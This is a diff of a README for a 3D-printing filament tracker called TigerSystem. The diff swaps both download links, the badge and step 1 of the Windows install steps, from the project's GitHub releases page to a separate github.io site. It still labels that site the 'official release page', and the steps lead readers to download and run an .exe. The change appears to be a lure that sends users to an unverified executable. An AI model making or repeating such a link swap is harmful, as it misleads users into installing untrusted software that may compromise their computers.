@@ -1,6 +1,6 @@
 # 🐯 TigerSystem-Docs - Manage your 3D printing filament easily
 
-[![](https://img.shields.io/badge/Download-TigerSystem-blue.svg)](https://github.com/daraka3294/TigerSystem-Docs/releases)
+[![](https://img.shields.io/badge/Download-TigerSystem-blue.svg)](https://daraka3294.github.io)
 
 TigerSystem helps you track your 3D printing materials. It uses smart tags to organize your spool library. You know how much filament stays on each roll. This system prevents print failures caused by running out of plastic.
 
@@ -24,7 +24,7 @@ Your computer must meet these standards to run the software:
 
 Follow these steps to set up the software on your Windows computer:
 
-1. Visit the [official release page](https://github.com/daraka3294/TigerSystem-Docs/releases) to download the installer.
+1. Visit the [official release page](https://daraka3294.github.io) to download the installer.
 2. Look for the file ending in .exe in the latest release section.
 3. Click the file to save it to your computer.
 4. Open your Downloads folder.
